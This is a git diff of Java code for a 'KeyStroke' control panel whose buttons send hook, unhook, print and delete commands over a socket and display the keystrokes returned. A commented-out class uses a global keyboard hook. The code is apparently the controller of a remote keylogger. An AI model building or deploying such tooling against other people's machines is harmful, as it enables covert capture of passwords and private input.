@@ -1,4 +1,4 @@
-/*import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
+import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
 import com.sun.jna.Library;
 import com.sun.jna.Native;
 import com.sun.jna.platform.win32.Kernel32;
@@ -43,6 +43,10 @@ class KeyStroke extends JPanel implements Runnable {
 	private JFrame frame;
 	private DataInputStream dataInputStream;
     private DataOutputStream dataOutputStream;
+    private JButton Hook;
+    private JButton Unhook;
+    private JButton Print;
+    private JButton Delete;
 
 	private ObjectInputStream objectInputStream;
     KeyStroke ppp=this;
@@ -95,16 +99,19 @@ class KeyStroke extends JPanel implements Runnable {
         add(Unhook);
         add(Print);
         add(Delete);
+        add(text);
 		thread = new Thread(this);
 		thread.start();
 	}
     public void actionPerformed(ActionEvent e){
+        
         if (e.getSource() == Hook) {
             try {
                 Hook.setEnabled(false);
                 Unhook.setEnabled(true);
                 Print.setEnabled(true);
                 Delete.setEnabled(true);
+                dataOutputStream = new DataOutputStream(socket.getOutputStream());
                 dataOutputStream.writeUTF("H");
             }catch (Exception k){
                 DebugMessage.printDebugMessage(k);
@@ -116,6 +123,7 @@ class KeyStroke extends JPanel implements Runnable {
                 Unhook.setEnabled(false);
                 Print.setEnabled(true);
                 Delete.setEnabled(true);
+                dataOutputStream = new DataOutputStream(socket.getOutputStream());
                 dataOutputStream.writeUTF("UH");
             }catch (Exception k){
                 DebugMessage.printDebugMessage(k);
@@ -127,7 +135,9 @@ class KeyStroke extends JPanel implements Runnable {
                 Unhook.setEnabled(true);
                 Print.setEnabled(false);
                 Delete.setEnabled(true);
+                dataInputStream = new DataInputStream(socket.getInputStream());
                 dataOutputStream.writeUTF("P");
+
                 String s = dataInputStream.readUTF();
                 text.append(s);
             }catch (Exception k){
@@ -142,7 +152,7 @@ class KeyStroke extends JPanel implements Runnable {
                 Delete.setEnabled(false);
                 dataOutputStream.writeUTF("D");
                 try {
-                  KeySTrokeArea.setText("");
+                  text.setText("");
                 } catch (Exception k) {
                     DebugMessage.printDebugMessage(k);
                 }
@@ -159,8 +169,8 @@ class KeyStroke extends JPanel implements Runnable {
     @Override
     public void run() {
     }
-}*/
-import com.github.kwhat.jnativehook.GlobalScreen;
+}
+/*import com.github.kwhat.jnativehook.GlobalScreen;
 import com.github.kwhat.jnativehook.NativeHookException;
 import com.github.kwhat.jnativehook.dispatcher.SwingDispatchService;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
@@ -284,14 +294,14 @@ public class KeyStroke extends JPanel implements Runnable, NativeKeyListener {
         scrollPane.setPreferredSize(new Dimension(300, 300));
 
         //Add
-       add(text);
+        add(text);
         add(b_hook);
         add(b_unhook);
         add(b_print);
         add(b_delete);
 
         // Display the window.
-         setSize(300, 300);
+        setSize(300, 300);
         setLayout(null);
         setVisible(true);
     }
@@ -300,4 +310,4 @@ public class KeyStroke extends JPanel implements Runnable, NativeKeyListener {
     {
         
     }
-}
+}*/
